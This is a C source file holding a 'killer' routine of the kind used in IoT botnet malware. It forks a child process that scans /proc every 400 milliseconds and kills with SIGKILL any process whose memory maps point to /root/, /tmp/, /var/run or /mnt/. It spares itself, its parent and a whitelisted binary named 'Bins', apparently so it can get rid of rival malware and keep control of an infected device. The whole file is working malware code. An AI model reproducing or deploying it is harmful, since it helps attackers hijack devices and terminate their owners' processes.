#include <fcntl.h>
#include <sys/prctl.h>
#include <signal.h>
#include <dirent.h>
#define SAFE_BINARY "Bins"

#include <string.h>

char self[512];
char *self_maps() {
    char path[32];

    strcpy(path, "/proc/self/maps");

    int fd = open(path, O_RDONLY);
    read(fd, self, sizeof(self) - 1);
    close(fd);

    return self;
}
void killer() {
    if(!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGTERM);

        int pid;
        DIR *proc;
        if((proc = opendir("/proc/")) == NULL)
            return;
        struct dirent *files;

        char *maps = self_maps();

        while(1) {
            while((files = readdir(proc))) {
                if((pid = atoi(files->d_name)) != getpid() && pid != getppid() && pid > 1) {
                    char path[32], buf[128];

                    strcpy(path, "/proc/");
                    strcat(path, files->d_name);
                    strcat(path, "/maps");

                    int fd = open(path, O_RDONLY);
                    read(fd, buf, sizeof(buf) - 1);
                    close(fd);

                    if((strstr(buf, "/root/") || strstr(buf, "/tmp/") || strstr(buf, "/var/run") || strstr(buf, "/mnt/")) && strcmp(maps, buf) && !strstr(buf, SAFE_BINARY))
                        kill(pid, 9);
                }
            }
            rewinddir(proc);
            usleep(400000);
        }
    }
}
